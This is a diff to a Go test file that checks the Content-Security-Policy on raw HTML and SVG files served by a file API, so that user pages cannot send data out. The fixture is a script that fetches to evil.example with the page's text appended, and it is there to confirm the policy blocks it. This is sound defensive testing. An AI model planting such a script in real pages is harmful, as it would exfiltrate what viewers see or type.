@@ -228,7 +228,7 @@ func TestRawServesHTMLSandboxed(t *testing.T) {
 // A home's HTML or SVG may run its own script, but it cannot send anything
 // anywhere: a page someone's code left in the home cannot pose as a sign-in
 // form on the platform's address and post what is typed to another host.
-func TestRawHTMLCannotReachTheNetwork(t *testing.T) {
+func TestRawHTMLAndSVGCannotReachTheNetwork(t *testing.T) {
 	t.Parallel()
 	for _, file := range []string{"report.html", "chart.svg"} {
 		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Content: "x"}, false, http.MethodGet, "/api/files/raw?path="+file)
@@ -238,6 +238,56 @@ func TestRawHTMLCannotReachTheNetwork(t *testing.T) {
 				t.Errorf("%s: CSP %q lacks %q", file, csp, want)
 			}
 		}
+	}
+}
+
+// cspDirectives splits a Content-Security-Policy into directive -> sources.
+func cspDirectives(csp string) map[string][]string {
+	out := map[string][]string{}
+	for _, d := range strings.Split(csp, ";") {
+		f := strings.Fields(d)
+		if len(f) > 0 {
+			out[f[0]] = f[1:]
+		}
+	}
+	return out
+}
+
+// A user's HTML page looks like the platform (it is on its address), so its
+// script must not send what the viewer types anywhere: no fetch, no form
+// post, no external script, style or image that could carry data out.
+func TestRawHTMLCannotReachTheNetwork(t *testing.T) {
+	t.Parallel()
+	l := &apitest.StubFilesLister{Content: "<script>fetch('https://evil.example/'+document.body.innerText)</script>"}
+	rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path=report.html")
+	d := cspDirectives(rec.Header().Get("Content-Security-Policy"))
+	for _, k := range []string{"default-src", "connect-src", "form-action", "base-uri", "frame-src", "object-src"} {
+		src, ok := d[k]
+		if k != "default-src" && !ok {
+			// Falls back to default-src (form-action and base-uri do not).
+			if k == "form-action" || k == "base-uri" {
+				t.Errorf("%s missing: %v", k, d)
+				continue
+			}
+			src = d["default-src"]
+		}
+		if strings.Join(src, " ") != "'none'" {
+			t.Errorf("%s = %v, want 'none'", k, src)
+		}
+	}
+	for _, k := range []string{"script-src", "style-src", "img-src", "font-src", "media-src"} {
+		src := d[k]
+		if src == nil {
+			src = d["default-src"]
+		}
+		for _, s := range src {
+			if strings.Contains(s, ".") || strings.Contains(s, "*") || s == "https:" || s == "http:" || s == "'self'" {
+				t.Errorf("%s allows a network source %q: %v", k, s, src)
+			}
+		}
+	}
+	if _, ok := d["sandbox"]; !ok {
+		t.Errorf("no sandbox: %v", d)
 	}
 }
 
